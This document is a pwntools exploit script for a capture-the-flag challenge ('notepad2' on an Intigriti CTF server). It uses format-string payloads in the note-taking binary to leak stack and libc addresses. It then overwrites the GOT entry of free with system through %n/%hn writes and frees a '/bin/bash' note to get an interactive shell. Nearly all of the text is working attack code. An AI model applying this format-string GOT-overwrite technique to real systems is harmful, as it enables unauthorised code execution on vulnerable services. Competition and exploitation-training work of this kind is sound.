#!/bin/python3
from pwn import *

context.log_level = 'INFO'
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['terminator', '-u', '-e']
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './notepad2_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "notepad2.ctf.intigriti.io"
PORT = 1342


######################################################################################

# breakrva [-h] [offset] [module]
# aslr [-h] [{off,on}]
gdb_script = f'''
    #set breakpoint pending on
    b *viewNote+228
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

def create(idx, note):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', note)

def view(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())

def remove(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())


######################################################################################

p = connect()

create(0, b'**%8$p|%13$p|')
view(0)

#create(1, b'/bin/sh')

p.recvuntil(b'**')
stack = int(p.recvuntil(b'|')[:-1], 16) 
print("[i] Stack:", hex(stack))

libc.address = int(p.recvuntil(b'|')[:-1], 16) - (0x7ffff7c28150 - 0x7ffff7c00000)
print("[i] Libc Base:", hex(libc.address))

remove(0)

system_low = (libc.sym.system & 0xffff)
free_low = (elf.got.free & 0xffff)

off = 0
if system_low > free_low:
    off = system_low - free_low - 2
else:
    off = (0x10000 + free_low) - system_low - 2

payload = f'%c%c%c%c%c%c%{elf.got.free-6}c%n'.encode()
payload += f'%c%c%{off}c%hn'.encode()

create(0, payload)
view(0)

system_low = (libc.sym.system & 0xffff0000) >> 16
free_low = ((elf.got.free + 2) & 0xffff)

off = 0
if system_low > free_low:
    off = system_low - free_low - 2
else:
    off = (0x10000 + free_low) - system_low - 2

payload = f'%c%c%c%c%c%c%{elf.got.free-6 + 2}c%n'.encode()
payload += f'%c%c%{off}c%hn'.encode()

create(1, payload)
view(1)

create(2, b'/bin/bash')
remove(2)

######################################################################################

p.interactive()